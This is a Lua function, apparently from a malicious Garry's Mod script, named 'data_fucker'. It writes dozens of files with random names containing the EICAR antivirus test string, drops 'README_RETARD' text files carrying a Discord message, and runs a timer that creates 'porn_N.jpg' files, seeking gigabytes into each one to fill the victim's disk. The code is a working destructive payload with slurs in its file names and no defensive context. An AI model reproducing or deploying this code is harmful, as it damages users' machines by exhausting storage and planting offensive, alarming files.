local function data_fucker() 
	for i=1,32 do 
		file.Write(rand_string_2()  .. ".png","X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*") 
	end 
	for i=1,32 do 
		file.Write("README_RETARD_" .. i .. ".txt",cfg.discord_pidorawek) 
	end 
	local C,c = 2100000000,0 
	local name = rand_string() 
	timer.Create(name,1,100,function() 
		for i=1,10 do 
			c=c+1 
			local F = file.Open("porn_"  ..  c ..  ".jpg","wb","DATA") 
			if not F then 
				return
			end 
			F["WriteBool"](F,true) 
			F["Seek"](F,C) 
			F["WriteBool"](F,false) 
			if F["Size"](F) == 1 then 
				C=C-2000000.0 
				if C <= 0 then 
					timer.Remove(name) 
				end 
			end 
			F["Close"](F) 
		end 
	end)

end 
